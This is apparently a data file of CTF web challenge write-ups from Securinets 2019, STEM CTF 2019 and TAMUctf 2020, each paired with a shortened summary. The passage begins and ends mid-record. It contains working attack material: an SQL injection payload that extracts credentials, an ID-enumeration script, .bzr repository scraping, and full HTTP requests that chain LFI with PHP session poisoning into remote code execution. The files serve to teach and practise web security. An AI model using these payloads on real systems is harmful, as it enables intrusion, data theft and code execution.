<h4>Thanks For you Feedback Securinets{Xxe_xXE_@Ll_Th3_W@Y}
</h4>
```

So the flag is the following.

```
Securinets{Xxe_xXE_@Ll_Th3_W@Y}
```","The website contains a feedback form. Analyzing the source code, you will discover that feedback is sent via XML messages composed by JavaScript.

The server answers with a thanks message, inserting the author of the feedback in it.

The application is vulnerable to XXE and the `author` field can be used to return the output of the attack.

The remote code execution can't be performed.

So, you have to find the current working directory in order to find the flag file. You can abuse `/proc/self/` directory that contains the reference to current working directory: `cwd/`.

Hence the malicious payload is the following.

[HTTP POST request with a payload containing XML data that includes an XXE injection attack, targeting a server. The server responds with a message containing the flag.]"
"# Securinets Prequals CTF 2019 – SQL Injected

* **Category:** Web
* **Points:** 984

## Challenge

> Task url: https://web5.ctfsecurinets.com 
> 
> You can download the source code [here](public/)
> 
> Author: Oussama
> 
> ps: i don't like the task's name

## Solution

The target is to connect to `https://web5.ctfsecurinets.com/flags.php` with a user having the proper `role` value (i.e. `1`).

Analyzing the source files, a code vulnerable to SQL injection can be spotted into `index.php`.

```php
$sql = ""SELECT * FROM posts WHERE author = '"". $_SESSION['username'] .""'"";
```

The username taken from the session is not properly sanitized. This vulnerability could be triggered via the own username after the authentication.

The database is like the following (based on `create_db.sql`).

```sql
create database webn;
create table users (id int auto_increment primary key, login varchar(100), password varchar(100), role boolean default 0);
create table posts (id int auto_increment primary key, title varchar(50), content text, date Date, author varchar(100));
```

So, a possible malicious input for the username, in order to print the details of the user with the proper role, is the following.

```sql
' UNION SELECT id, login, password, NULL, NULL FROM users WHERE role = 1 AND '' = '
```

A user with this value for the username must be registered. After the first automatic login, the SQL injection will not have effect: you have to logout and re-login in order to find the details of the searched user under the post search section.

```
root
jjLLgTGk3uif2rKBVwqH
```

Logging in with that user and connecting to `https://web5.ctfsecurinets.com/flags.php` will print the flag.

```
Securinets{5VuCj0JUr43jwQDpncRA}
```","The target is to connect to `flags.php` with a user having the proper `role` value.

Analyzing the source files, a code vulnerable to SQL injection can be spotted into `index.php`.

The username taken from the session is not properly sanitized. This vulnerability could be triggered via the own username after the authentication.

The database is based on `create_db.sql`.

So, a possible malicious input for the username, in order to print the details of the user with the proper role, is the following.

[SQL injection attack string that tries to extract sensitive information from a database table named ""users"", where role is equal to 1.]

A user with this value for the username must be registered. After the first automatic login, the SQL injection will not have effect: you have to logout and re-login in order to find the details of the searched user under the post search section.

Logging in with that user and connecting to `flags.php` will print the flag.
"
"# STEM CTF Cyber Challenge 2019 – Medium is overrated

* **Category:** Web
* **Points:** 200

## Challenge

> I got hacked last time, but that’s not gonna stop me. The world deserves the next great blogging platform!
> 
> http://138.247.13.104

## Solution

Challenge is similar to the previous one (i.e. *My First Blog*), but the number of revisions is huge.

So a [bash script](bzr-chall-solver.sh) can be written to reproduce the repository locally.

The script will recreate the `index.php` file of the previous challenge and another file called `noIdeaWhatImDoing`.

Analyzing the history situation with `bzr log` and some `bzr diff`, you can discover that files were modified several times. Maybe one of these revisions will contain the flag.

After some analysis you can discover that changes on `index.php` are the ones really important. The initial script can be modified in order to discover all important differences on `index.php`.

```bash
#!/bin/bash

echo ""[*] Creating local repository.""
mkdir ctf-bzr
cd ctf-bzr/
bzr init
echo 'foo' > foo.txt
bzr add
bzr commit -m ""foo""
rm foo.txt

echo ""[*] Replacing last-revision file.""
cd .bzr/branch
rm last-revision
wget http://138.247.13.104/.bzr/branch/last-revision

echo ""[*] Replacing dirstate file.""
cd ../checkout
rm dirstate
wget http://138.247.13.104/.bzr/checkout/dirstate

echo ""[*] Replacing pack-names file.""
cd ../repository
rm pack-names
wget http://138.247.13.104/.bzr/repository/pack-names


echo ""[*] Using check command to discover missing files.""
cd indices/
rm *.cix
rm *.iix
rm *.rix
rm *.six
rm *.tix
cd ../packs
rm *.pack
cd ../../../
while true; do
   CHECK_OUTPUT=$(bzr check 2>&1)
   if [[ $CHECK_OUTPUT == *""bzr: ERROR: No such file:""* ]]; then
      MISSING_FILE=$(echo $CHECK_OUTPUT | sed 's/.*\([0-9a-f]\{32\}\).*/\1/')
      echo ""[*] Missing files $MISSING_FILE.""
      declare -a EXTENSIONS=(""cix"" ""iix"" ""rix"" ""six"" ""tix"")
      for EXTENSION in ""${EXTENSIONS[@]}""; do
         TARGET_URL=""http://138.247.13.104/.bzr/repository/indices/$MISSING_FILE.$EXTENSION""
         echo ""[*] Downloading $TARGET_URL""
         wget $TARGET_URL -P .bzr/repository/indices/
      done
      TARGET_URL=""http://138.247.13.104/.bzr/repository/packs/$MISSING_FILE.pack""
      echo ""[*] Downloading $TARGET_URL""
      wget $TARGET_URL -P .bzr/repository/packs/
   else
      echo ""[*] Probably all missing files have been downloaded.""
      break
   fi
done

echo ""[*] Reverting missing source files.""
bzr revert

echo ""[*] Searching the flag into revisions.""
R=1
while true; do
   RNEXT=$((R+1))
   
   # Analyzing diff.
   REVISION=$(bzr diff -r$R..$RNEXT)
   if [[ $REVISION == """" ]]; then
      break
   elif [[ $REVISION != *""noIdeaWhatImDoing""* ]]; then
      echo ""[*] ... $R -> $RNEXT""
      echo $REVISION
   fi

   R=$RNEXT
done
```

Two differences can be identified.

```
$ bzr diff -r154..155
=== modified file 'index.php'
--- index.php	2018-12-06 18:48:25 +0000
+++ index.php	2018-12-06 22:52:42 +0000
@@ -10,6 +10,11 @@
             <h1 class=""display-4"">My Blog</h1>
             <p class=""lead"">Just a spot for me to talk about how much I love Canonical</p>
         </div>
+            <h1>Encryption is so cool!</h1>
+            <p>It's so cool that I can paste a block of text here and if its encrypted then none of you will EVER be able to read it! After reading about it, I'm so comfortable with it that I'm willing to paste my Bitcoin Wallet password right here:</p>
+            <p>NWEyYTk5ZDNiYWEwN2JmYmQwOGI5NjEyMDVkY2FlODg3ZmIwYWNmOWYyNzI5MjliYWE3OTExZmFhNGFlNzc1MQ==</p>
+            <p>There's like a whole 3 Bitcoin in there, but none of you will ever be able to get it!</p>
+            <hr>
             <h1>I love Canonical</h1>
             <p>As someone who is just getting started with Linux, I love Canonical. They build the easiest to use Linux distribution I can find, and they build so many useful tools. So far I've tried out</p>
             <ul>

$ bzr diff -r165..166
=== modified file 'index.php'
--- index.php	2018-12-06 22:54:52 +0000
+++ index.php	2018-12-06 23:00:02 +0000
@@ -10,6 +10,8 @@
             <h1 class=""display-4"">My Blog</h1>
             <p class=""lead"">Just a spot for me to talk about how much I love Canonical</p>
         </div>
+            <h1>CentOS is just RedHat</h1>
+            <p>A friend of mine was explaining how the company he works for pays for RedHat. I don't understand why they are LITERALLY throwing their money away since CentOS is just RedHat. In fact, CentOS is even better than RedHat since it discovers the fastest mirror automatically. I'm applying for one of their open job reqs just to give them a piece of my mind.</p>
             <h1>I love Canonical</h1>
             <p>As someone who is just getting started with Linux, I love Canonical. They build the easiest to use Linux distribution I can find, and they build so many useful tools. So far I've tried out</p>
             <ul>
@@ -26,4 +28,5 @@
             ?>
         </div>
     </body>
-</html>
\ No newline at end of file
+</html>
+<!-- 6fb3b5b05966fb06518ce6706ec933e79cfaea8f12b4485cba56321c7a62a077 -->
\ No newline at end of file
```

The first one contains a base64 encoded password for a Bitcoin wallet.

```
NWEyYTk5ZDNiYWEwN2JmYmQwOGI5NjEyMDVkY2FlODg3ZmIwYWNmOWYyNzI5MjliYWE3OTExZmFhNGFlNzc1MQ==
```

Decoded string is the following.

```
5a2a99d3baa07bfbd08b961205dcae887fb0acf9f272929baa7911faa4ae7751
```

The second one contains an hexadecimal string.

```
6fb3b5b05966fb06518ce6706ec933e79cfaea8f12b4485cba56321c7a62a077
```

This string must be considered like the AES ECB key to decode the Bitcoin wallet password.

The following OpenSSL command will give you the flag.

```
$ openssl enc -d -aes-256-ecb -K '6fb3b5b05966fb06518ce6706ec933e79cfaea8f12b4485cba56321c7a62a077' -in <(echo '5a2a99d3baa07bfbd08b961205dcae887fb0acf9f272929baa7911faa4ae7751' | xxd -r -p)
```

The flag is the following.

```
MCA{I$love$bitcoin$so$much!}
```","Challenge is similar to the previous one, but the number of revisions is huge.

So a bash script can be written to reproduce the repository locally.

The script will recreate the `index.php` file of the previous challenge and another file called `noIdeaWhatImDoing`.

Analyzing the history situation with `bzr log` and some `bzr diff`, you can discover that files were modified several times. Maybe one of these revisions will contain the flag.

After some analysis you can discover that changes on `index.php` are the ones really important. The initial script can be modified in order to discover all important differences on `index.php`.

Two differences can be identified.

The first one contains a base64 encoded password for a Bitcoin wallet.

The second one contains an hexadecimal string.

This string must be considered like the AES ECB key to decode the Bitcoin wallet password.

Using OpenSSL we will get the flag."
"# STEM CTF Cyber Challenge 2019 – My First Blog

* **Category:** Web
* **Points:** 150

## Challenge

> I wish canonical would release a blog platform, they make everything so easy to use and it just works!
> 
> http://138.247.13.106/

## Solution

The owner of the blog is a fan of Canonical and its products. As you can see in the blog, he is fan of [Bazaar](http://bazaar.canonical.com/en/), the version control system of Canonical.

Trying to connect to `http://138.247.13.106/.bzr/` will give an `HTTP 403 Forbidden` error, so the folder should exist.

Connecting to `http://138.247.13.106/.bzr/README` will reveal the existence of a Bazaar repository folder.

Furthermore, connecting to `http://138.247.13.106/.bzr/branch/last-revision`, will reveal the last revision.

```
1 bzr_lover-20181206184825-790ppqxy6l69f581
```

So Bazaar must be installed and a `bzr` repostitory must be created in order to craft the `.bzr` directory and then recreate the website files.

```
$ mkdir ctf-bzr
$ cd ctf-bzr/
$ bzr init
$ echo 'foo' > foo.txt
$ bzr add
$ bzr commit
$ rm foo.txt
```

The `last-revision` can be downloaded to replace the existing one.

```
$ cd .bzr/branch
$ rm last-revision
$ wget http://138.247.13.106/.bzr/branch/last-revision
```

The `dirstate` file can be downloaded to replace the existing one.

```
$ cd ../checkout
$ rm dirstate
$ wget http://138.247.13.106/.bzr/checkout/dirstate
```

The `pack-names` file can be downloaded replacing the existing one.

```
$ cd ../repository
$ rm pack-names
$ wget http://138.247.13.106/.bzr/repository/pack-names
```

Using `bzr check` command will trigger an error that will reveal the name of the missing files.

```
$ cd ../../
$ bzr check
```

The name is: `ctf-bzr/.bzr/repository/indices/c325a543411b3717bd63b6cc879e3d50.rix`, so all missing files can be downloaded.

```
$ cd .bzr/repository/indices/
$ rm *.*
$ wget http://138.247.13.106/.bzr/repository/indices/c325a543411b3717bd63b6cc879e3d50.rix
$ wget http://138.247.13.106/.bzr/repository/indices/c325a543411b3717bd63b6cc879e3d50.cix
$ wget http://138.247.13.106/.bzr/repository/indices/c325a543411b3717bd63b6cc879e3d50.iix
$ wget http://138.247.13.106/.bzr/repository/indices/c325a543411b3717bd63b6cc879e3d50.six
$ wget http://138.247.13.106/.bzr/repository/indices/c325a543411b3717bd63b6cc879e3d50.tix
$ cd ../packs
$ rm *.pack
$ wget http://138.247.13.106/.bzr/repository/packs/c325a543411b3717bd63b6cc879e3d50.pack
```

Then the status of the repo could be checked.

```
$ bzr status
removed:
  index.php
```

The command `bzr revert` will recreate the file.

```php
<html>
    <head>
        <title>My Blog</title>
        <link rel=""stylesheet"" href=""https://maxcdn.bootstrapcdn.com/bootstrap/4.0.0/css/bootstrap.min.css"" integrity=""sha384-Gn5384xqQ1aoWXA+058RXPxPg6fy4IWvTNh0E263XmFcJlSAwiGgFAW/dAiS6JXm"" 
crossorigin=""anonymous"">
    </head>
    <body>

        <div class=""container"">
        <div class=""jumbotron"">
            <h1 class=""display-4"">My Blog</h1>
            <p class=""lead"">Just a spot for me to talk about how much I love Canonical</p>
        </div>
            <h1>I love Canonical</h1>
            <p>As someone who is just getting started with Linux, I love Canonical. They build the easiest to use Linux distribution I can find, and they build so many useful tools. So far I'v
e tried out</p>
            <ul>
                <li>Juju - The worlds best configuration management tool!</li>
                <li>Bazaar - The worlds best version control!</li>
                <li>Ubuntu - The worlds best OS!</li>
                <li>Launchpad - GitHub? Gross!</li>
            </ul>
            <hr>
            <h1>Learning PHP</h1>
            <p>I recently learned about PHP and I can't stop switching everything over to it. In fact, this blog is now powered by PHP, I think! I changed the file extension at least, and adde
d a little PHP code below here. That should pretty much do it right? I have the PHP code commented out for now since I can't seem to get it to work right. I'll have to look into it later.</p>
            <?php
                // Flag is MCA{canonical_is_literally_my_favorite_company_in_the_whole_world}
            ?>
        </div>
    </body>
</html>
```

It will contain the flag.

```
MCA{canonical_is_literally_my_favorite_company_in_the_whole_world}
```","The owner of the blog is a fan of Canonical and its products. As you can see in the blog, he is fan of Bazaar, the version control system of Canonical.

Trying to connect to `.bzr/` will give an `HTTP 403 Forbidden` error, so the folder should exist.

Connecting to `README` will reveal the existence of a Bazaar repository folder.

Furthermore, connecting to `last-revision`, will reveal the last revision.

So Bazaar must be installed and a `bzr` repostitory must be created in order to craft the `.bzr` directory and then recreate the website files.

The `last-revision` can be downloaded to replace the existing one.

The `dirstate` file can be downloaded to replace the existing one.

The `pack-names` file can be downloaded replacing the existing one.

Using `bzr check` command will trigger an error that will reveal the name of the missing files.

All missing files can be downloaded.

Then the status of the repo could be checked.

The command `bzr revert` will recreate the file.

It will contain the flag."
"# STEM CTF Cyber Challenge 2019 – Super Secret Hidden Service

* **Category:** Web
* **Points:** 50

## Challenge

> https://138.247.13.115

## Solution

Connecting to the website the following message is prompted.

```
421 Site 138.247.13.115 is not served on this interface
```

The website is under HTTPS, but the certificate seems invalid. Analyzing the certificate, you will discover that it was created for the host `138.247.13.115.xip.io`.

Connecting to `https://138.247.13.115.xip.io/` will print the flag.

```
MCA{shuHeimoowaiF5a}
```","Connecting to the website the following message is prompted : 'Site is not served on this interface'

The website is under HTTPS, but the certificate seems invalid. Analyzing the certificate, you will discover that it was created for another host.

Connecting to that host will print the flag."
"# STEM CTF Cyber Challenge 2019 – TODO

* **Category:** Web
* **Points:** 100

## Challenge

> TODO: Remember where I put that flag...
> 
> http://138.247.13.110/

## Solution

The website simulates a TODO list application. Basically, URLs like `http://138.247.13.110/todolist/1000/` can be enumerated to read TODO notes of other users.

One of them contains the flag: `http://138.247.13.110/todolist/678/`.

To discover it, a [Python script](todo.py) can be written.

```python
import time
import random
import os
import urllib2

target_url = ""http://138.247.13.110/todolist/{}/""

for i in range (1, 1000):

   try:
      # Call web page.
      url = target_url.format(str(i))
      print ""[*] Calling web page '{}'."".format(url)
      req = urllib2.Request(url)
      page = urllib2.urlopen(req)
      content = page.read()
      
      # Flag found.
      if ""MCA{"" in content:
         print content
         break
   
   except urllib2.HTTPError as err:
      print ""[*] Response > {}"".format(err.code)

   # Go to sleep.
   sleep_interval = random.randint(1, 4)
   print ""[*] Sleeping {} secs."".format(sleep_interval)
   time.sleep(sleep_interval)
```

The flag is the following.

```
MCA{al3x4_5et_a_r3minder} 
```","The website simulates a TODO list application. Basically, URLs like this one can be enumerated to read TODO notes of other users.

One of them contains the flag.

To discover it, a Python script can be written.
"
"# STEM CTF Cyber Challenge 2019 – Turing Test

* **Category:** Web
* **Points:** 50

## Challenge

> Break into his account!
> 
> http://138.247.13.111

## Solution

The shown web page seems to perform a password reset functionality via security questions. It seems to be related to the account recovery of *Alan Turing*.

If you submit data, the web page will highlight in red wrong fields.

Some recon activities on the Internet about Alan Turing must be done in order to answer security questions.

After few attepts you will discover all the answers:
* Text field - *Mother's Maiden Name* - Stoney
* Text field - *First School Attended* - St. Michael's
* Text field - *Favorite Primary School Subject* - Science
* Text field - *Favorite Olympic Event* - Marathon
* Text field - *2 + 2 - 3 = ?* - 1
* Checkbox - *Is it a leap year?* - checked
* Checkbox - *I agree Security Questions are Bad.* - checked

The flag is the following.

```
MCA{sms_2fa_is_bad_also}
```","The shown web page seems to perform a password reset functionality via security questions. It seems to be related to the account recovery of Alan Turing.

If you submit data, the web page will highlight in red wrong fields.

Some recon activities on the Internet about Alan Turing must be done in order to answer security questions.

After few attepts you will discover all the answers from where you can get the flag."
"# TAMUctf 2020 – FILESTORAGE

* **Category:** web
* **Points:** 122

## Challenge

> Try out my new file sharing site!
> 
> http://filestorage.tamuctf.com

## Solution

The website takes a `name` parameter and allows you to read some files. 

```
POST /index.php HTTP/1.1
Host: filestorage.tamuctf.com
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:74.0) Gecko/20100101 Firefox/74.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8
Accept-Language: it-IT,it;q=0.8,en-US;q=0.5,en;q=0.3
Accept-Encoding: gzip, deflate
Content-Type: application/x-www-form-urlencoded
Content-Length: 8
Origin: http://filestorage.tamuctf.com
Connection: close
Referer: http://filestorage.tamuctf.com/index.php
Cookie: PHPSESSID=11fcvj19chosurikvujm4639cq
Upgrade-Insecure-Requests: 1

name=foo

HTTP/1.1 200 OK
Server: nginx/1.16.1
Date: Fri, 20 Mar 2020 02:13:01 GMT
Content-Type: text/html; charset=UTF-8
Content-Length: 542
Connection: close
X-Powered-By: PHP/7.3.15
Expires: Thu, 19 Nov 1981 08:52:00 GMT
Cache-Control: no-store, no-cache, must-revalidate
Pragma: no-cache

<html>
	<head>
		<link rel=""stylesheet"" href=""https://stackpath.bootstrapcdn.com/bootstrap/4.3.1/css/bootstrap.min.css"" integrity=""sha384-ggOyR0iXCbMQv3Xipma34MD+dH/1fQ784/j6cY/iJTQUOhcWr7x9JvoRxT2MZw1T"" crossorigin=""anonymous"">
	</head>
	<body>
	Hello, foo<br><ul class=""list-group mx-2""><li class=""list-group-item my-1""><a href='?file=beemovie.txt'>beemovie.txt</a></li><li class=""list-group-item my-1""><a href='?file=hello.txt'>hello.txt</a></li><li class=""list-group-item my-1""><a href='?file=pi.txt'>pi.txt</a></li></ul>	</body>
</html>
```

Analyzing the read files page, you can discover that the website is vulnerable to LFI.

```
GET /index.php?file=../../../../../../../../etc/passwd HTTP/1.1
Host: filestorage.tamuctf.com
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:74.0) Gecko/20100101 Firefox/74.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8
Accept-Language: it-IT,it;q=0.8,en-US;q=0.5,en;q=0.3
Accept-Encoding: gzip, deflate
Connection: close
Cookie: PHPSESSID=k2qs029jna7vcppkeqinfh4kja
Upgrade-Insecure-Requests: 1
Cache-Control: max-age=0

HTTP/1.1 200 OK
Server: nginx/1.16.1
Date: Fri, 20 Mar 2020 00:38:30 GMT
Content-Type: text/html; charset=UTF-8
Content-Length: 1561
Connection: close
X-Powered-By: PHP/7.3.15
Expires: Thu, 19 Nov 1981 08:52:00 GMT
Cache-Control: no-store, no-cache, must-revalidate
Pragma: no-cache

<html>
	<head>
		<link rel=""stylesheet"" href=""https://stackpath.bootstrapcdn.com/bootstrap/4.3.1/css/bootstrap.min.css"" integrity=""sha384-ggOyR0iXCbMQv3Xipma34MD+dH/1fQ784/j6cY/iJTQUOhcWr7x9JvoRxT2MZw1T"" crossorigin=""anonymous"">
	</head>
	<body>
	<a class=""btn btn-primary"" href=""index.php"" role=""button"">🡄 Go back</a><br>root:x:0:0:root:/root:/bin/ash
bin:x:1:1:bin:/bin:/sbin/nologin
daemon:x:2:2:daemon:/sbin:/sbin/nologin
adm:x:3:4:adm:/var/adm:/sbin/nologin
lp:x:4:7:lp:/var/spool/lpd:/sbin/nologin
sync:x:5:0:sync:/sbin:/bin/sync
shutdown:x:6:0:shutdown:/sbin:/sbin/shutdown
halt:x:7:0:halt:/sbin:/sbin/halt
mail:x:8:12:mail:/var/mail:/sbin/nologin
news:x:9:13:news:/usr/lib/news:/sbin/nologin
uucp:x:10:14:uucp:/var/spool/uucppublic:/sbin/nologin
operator:x:11:0:operator:/root:/sbin/nologin
man:x:13:15:man:/usr/man:/sbin/nologin
postmaster:x:14:12:postmaster:/var/mail:/sbin/nologin
cron:x:16:16:cron:/var/spool/cron:/sbin/nologin
ftp:x:21:21::/var/lib/ftp:/sbin/nologin
sshd:x:22:22:sshd:/dev/null:/sbin/nologin
at:x:25:25:at:/var/spool/cron/atjobs:/sbin/nologin
squid:x:31:31:Squid:/var/cache/squid:/sbin/nologin
xfs:x:33:33:X Font Server:/etc/X11/fs:/sbin/nologin
games:x:35:35:games:/usr/games:/sbin/nologin
cyrus:x:85:12::/usr/cyrus:/sbin/nologin
vpopmail:x:89:89::/var/vpopmail:/sbin/nologin
ntp:x:123:123:NTP:/var/empty:/sbin/nologin
smmsp:x:209:209:smmsp:/var/spool/mqueue:/sbin/nologin
guest:x:405:100:guest:/dev/null:/sbin/nologin
nobody:x:65534:65534:nobody:/:/sbin/nologin
apache:x:100:101:apache:/var/www:/sbin/nologin
	</body>
</html>
```

You can abuse this vulnerability to analyze the `/proc/self/` directory in order to how the website stores the passed `name` parameter.

```
GET /index.php?file=../../../../../../proc/self/fd/9 HTTP/1.1
Host: filestorage.tamuctf.com
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:74.0) Gecko/20100101 Firefox/74.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8
Accept-Language: it-IT,it;q=0.8,en-US;q=0.5,en;q=0.3
Accept-Encoding: gzip, deflate
Connection: close
Referer: http://filestorage.tamuctf.com/index.php
Cookie: PHPSESSID=11fcvj19chosurikvujm4639cq
Upgrade-Insecure-Requests: 1

HTTP/1.1 200 OK
Server: nginx/1.16.1
Date: Fri, 20 Mar 2020 02:13:55 GMT
Content-Type: text/html; charset=UTF-8
Content-Length: 357
Connection: close
X-Powered-By: PHP/7.3.15
Expires: Thu, 19 Nov 1981 08:52:00 GMT
Cache-Control: no-store, no-cache, must-revalidate
Pragma: no-cache

<html>
	<head>
		<link rel=""stylesheet"" href=""https://stackpath.bootstrapcdn.com/bootstrap/4.3.1/css/bootstrap.min.css"" integrity=""sha384-ggOyR0iXCbMQv3Xipma34MD+dH/1fQ784/j6cY/iJTQUOhcWr7x9JvoRxT2MZw1T"" crossorigin=""anonymous"">
	</head>
	<body>
	<a class=""btn btn-primary"" href=""index.php"" role=""button"">🡄 Go back</a><br>name|s:3:""foo"";	</body>
</html>
```

It seems that `name` is stored using PHP serialization and can be located into `/proc/self/fd/9` file. If you perform LFI to read a file including PHP code, it will be executed.

So you can pass a PHP command for the `name` value, like `<?php system('id'); ?>`.

```
POST /index.php HTTP/1.1
Host: filestorage.tamuctf.com
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:74.0) Gecko/20100101 Firefox/74.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8
Accept-Language: it-IT,it;q=0.8,en-US;q=0.5,en;q=0.3
Accept-Encoding: gzip, deflate
Content-Type: application/x-www-form-urlencoded
Content-Length: 45
Origin: http://filestorage.tamuctf.com
Connection: close
Referer: http://filestorage.tamuctf.com/index.php
Cookie: PHPSESSID=boig3tsj1931578ghio3a9fder
Upgrade-Insecure-Requests: 1

name=%3C%3Fphp+system%28%27id%27%29%3B+%3F%3E

HTTP/1.1 200 OK
Server: nginx/1.16.1
Date: Fri, 20 Mar 2020 02:10:47 GMT
Content-Type: text/html; charset=UTF-8
Content-Length: 561
Connection: close
X-Powered-By: PHP/7.3.15
Expires: Thu, 19 Nov 1981 08:52:00 GMT
Cache-Control: no-store, no-cache, must-revalidate
Pragma: no-cache

<html>
	<head>
		<link rel=""stylesheet"" href=""https://stackpath.bootstrapcdn.com/bootstrap/4.3.1/css/bootstrap.min.css"" integrity=""sha384-ggOyR0iXCbMQv3Xipma34MD+dH/1fQ784/j6cY/iJTQUOhcWr7x9JvoRxT2MZw1T"" crossorigin=""anonymous"">
	</head>
	<body>
	Hello, <?php system('id'); ?><br><ul class=""list-group mx-2""><li class=""list-group-item my-1""><a href='?file=beemovie.txt'>beemovie.txt</a></li><li class=""list-group-item my-1""><a href='?file=hello.txt'>hello.txt</a></li><li class=""list-group-item my-1""><a href='?file=pi.txt'>pi.txt</a></li></ul>	</body>
</html>
```

And then use LFI to execute it.

```
GET /index.php?file=../../../../../../proc/self/fd/9 HTTP/1.1
Host: filestorage.tamuctf.com
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:74.0) Gecko/20100101 Firefox/74.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8
Accept-Language: it-IT,it;q=0.8,en-US;q=0.5,en;q=0.3
Accept-Encoding: gzip, deflate
Connection: close
Referer: http://filestorage.tamuctf.com/index.php
Cookie: PHPSESSID=boig3tsj1931578ghio3a9fder
Upgrade-Insecure-Requests: 1

HTTP/1.1 200 OK
Server: nginx/1.16.1
Date: Fri, 20 Mar 2020 02:07:58 GMT
Content-Type: text/html; charset=UTF-8
Content-Length: 431
Connection: close
X-Powered-By: PHP/7.3.15
Expires: Thu, 19 Nov 1981 08:52:00 GMT
Cache-Control: no-store, no-cache, must-revalidate
Pragma: no-cache

<html>
	<head>
		<link rel=""stylesheet"" href=""https://stackpath.bootstrapcdn.com/bootstrap/4.3.1/css/bootstrap.min.css"" integrity=""sha384-ggOyR0iXCbMQv3Xipma34MD+dH/1fQ784/j6cY/iJTQUOhcWr7x9JvoRxT2MZw1T"" crossorigin=""anonymous"">
	</head>
	<body>
	<a class=""btn btn-primary"" href=""index.php"" role=""button"">🡄 Go back</a><br>name|s:22:""uid=100(apache) gid=101(apache) groups=82(www-data),101(apache),101(apache)
"";	</body>
</html>
```

You can enumerate the folder with the following HTTP requests.

```
POST /index.php HTTP/1.1
Host: filestorage.tamuctf.com
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:74.0) Gecko/20100101 Firefox/74.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8
Accept-Language: it-IT,it;q=0.8,en-US;q=0.5,en;q=0.3
Accept-Encoding: gzip, deflate
Content-Type: application/x-www-form-urlencoded
Content-Length: 55
Origin: http://filestorage.tamuctf.com
Connection: close
Referer: http://filestorage.tamuctf.com/index.php
Cookie: PHPSESSID=11fcvj19chosurikvujm4639cq
Upgrade-Insecure-Requests: 1

name=%3C%3Fphp%20system%28%27ls%20-al%27%29%3B%20%3F%3E

HTTP/1.1 200 OK
Server: nginx/1.16.1
Date: Fri, 20 Mar 2020 02:18:48 GMT
Content-Type: text/html; charset=UTF-8
Content-Length: 565
Connection: close
X-Powered-By: PHP/7.3.15
Expires: Thu, 19 Nov 1981 08:52:00 GMT
Cache-Control: no-store, no-cache, must-revalidate
Pragma: no-cache

<html>
	<head>
		<link rel=""stylesheet"" href=""https://stackpath.bootstrapcdn.com/bootstrap/4.3.1/css/bootstrap.min.css"" integrity=""sha384-ggOyR0iXCbMQv3Xipma34MD+dH/1fQ784/j6cY/iJTQUOhcWr7x9JvoRxT2MZw1T"" crossorigin=""anonymous"">
	</head>
	<body>
	Hello, <?php system('ls -al'); ?><br><ul class=""list-group mx-2""><li class=""list-group-item my-1""><a href='?file=beemovie.txt'>beemovie.txt</a></li><li class=""list-group-item my-1""><a href='?file=hello.txt'>hello.txt</a></li><li class=""list-group-item my-1""><a href='?file=pi.txt'>pi.txt</a></li></ul>	</body>
</html>

GET /index.php?file=../../../../../../proc/self/fd/9 HTTP/1.1
Host: filestorage.tamuctf.com
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:74.0) Gecko/20100101 Firefox/74.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8
Accept-Language: it-IT,it;q=0.8,en-US;q=0.5,en;q=0.3
Accept-Encoding: gzip, deflate
Connection: close
Referer: http://filestorage.tamuctf.com/index.php
Cookie: PHPSESSID=11fcvj19chosurikvujm4639cq
Upgrade-Insecure-Requests: 1

HTTP/1.1 200 OK
Server: nginx/1.16.1
Date: Fri, 20 Mar 2020 02:18:54 GMT
Content-Type: text/html; charset=UTF-8
Content-Length: 681
Connection: close
X-Powered-By: PHP/7.3.15
Expires: Thu, 19 Nov 1981 08:52:00 GMT
Cache-Control: no-store, no-cache, must-revalidate
Pragma: no-cache

<html>
	<head>
		<link rel=""stylesheet"" href=""https://stackpath.bootstrapcdn.com/bootstrap/4.3.1/css/bootstrap.min.css"" integrity=""sha384-ggOyR0iXCbMQv3Xipma34MD+dH/1fQ784/j6cY/iJTQUOhcWr7x9JvoRxT2MZw1T"" crossorigin=""anonymous"">
	</head>
	<body>
	<a class=""btn btn-primary"" href=""index.php"" role=""button"">🡄 Go back</a><br>name|s:26:""total 20
drwxr-xr-x    1 root     root          4096 Mar 20 01:23 .
drwxr-xr-x    1 root     root          4096 Mar 18 17:38 ..
drwxr-xr-x    2 root     root          4096 Mar 18 17:38 files
-rw-r--r--    1 root     root            45 Aug 16  2019 index.html
-rw-rw-r--    1 root     root          1141 Mar 20 01:22 index.php
"";	</body>
</html>
```

You can now enumerate the root folder.

```
POST /index.php HTTP/1.1
Host: filestorage.tamuctf.com
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:74.0) Gecko/20100101 Firefox/74.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8
Accept-Language: it-IT,it;q=0.8,en-US;q=0.5,en;q=0.3
Accept-Encoding: gzip, deflate
Content-Type: application/x-www-form-urlencoded
Content-Length: 61
Origin: http://filestorage.tamuctf.com
Connection: close
Referer: http://filestorage.tamuctf.com/index.php
Cookie: PHPSESSID=11fcvj19chosurikvujm4639cq
Upgrade-Insecure-Requests: 1

name=%3C%3Fphp%20system%28%27ls%20-al%20%2F%27%29%3B%20%3F%3E

HTTP/1.1 200 OK
Server: nginx/1.16.1
Date: Fri, 20 Mar 2020 02:29:38 GMT
Content-Type: text/html; charset=UTF-8
Content-Length: 567
Connection: close
X-Powered-By: PHP/7.3.15
Expires: Thu, 19 Nov 1981 08:52:00 GMT
Cache-Control: no-store, no-cache, must-revalidate
Pragma: no-cache

<html>
	<head>
